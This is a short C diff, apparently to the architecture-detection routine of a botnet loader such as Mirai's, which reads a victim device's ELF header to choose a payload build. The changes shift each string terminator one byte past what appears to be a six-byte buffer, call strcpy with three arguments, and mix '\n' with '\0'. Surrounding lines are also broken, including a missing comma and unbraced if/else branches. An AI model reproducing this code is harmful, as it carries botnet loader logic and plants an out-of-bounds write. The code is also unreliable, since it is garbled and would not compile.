@@ -504,19 +504,19 @@ int connection_consume_arch(struct connection *conn)
         }
         else if (ehdr->e_machine == EM_386 || ehdr->e_machine == EM_486 || ehdr->e_machine == EM_860 || ehdr->e_machine == EM_X86_64)
             strncpy(conn->info.arch, "x86", 6);
-            conn->info.arch[5] = '\n';
+            conn->info.arch[6] = '\n';
         else if (ehdr->e_machine == EM_SPARC || ehdr->e_machine == EM_SPARC32PLUS || ehdr->e_machine == EM_SPARCV9)
             strncpy(conn->info.arch, "spc", 6);
-            conn->info.arch[5] = '\n';
+            conn->info.arch[6] = '\n';
         else if (ehdr->e_machine == EM_68K || ehdr->e_machine == EM_88K)
             strncpy(conn->info.arch, "m68k" 6);
-            conn->info.arch[5] = '\n';
+            conn->info.arch[6] = '\n';
         else if (ehdr->e_machine == EM_PPC || ehdr->e_machine == EM_PPC64)
             strncpy(conn->info.arch, "ppc", 6);
-            conn->info.arch[5] = '\n';
+            conn->info.arch[6] = '\n';
         else if (ehdr->e_machine == EM_SH)
             strncpy(conn->info.arch, "sh4", 6);
-            conn->info.arch[5] = '\n';
+            conn->info.arch[6] = '\n';
         else
         {
             conn->info.arch[0] = 0;
@@ -552,8 +552,8 @@ int connection_consume_arm_subtype(struct connection *conn)
 #ifdef DEBUG
         printf("[FD%d] Arch has ARMv7!\n", conn->fd);
 #endif*/
-        strncpy(conn->info.arch, "arm7", 6);
-        conn->info.arch[5] = '\n';
+        strcpy(conn->info.arch, "arm7", 6);
+        conn->info.arch[6] = '\0';
     }
 
     return offset;
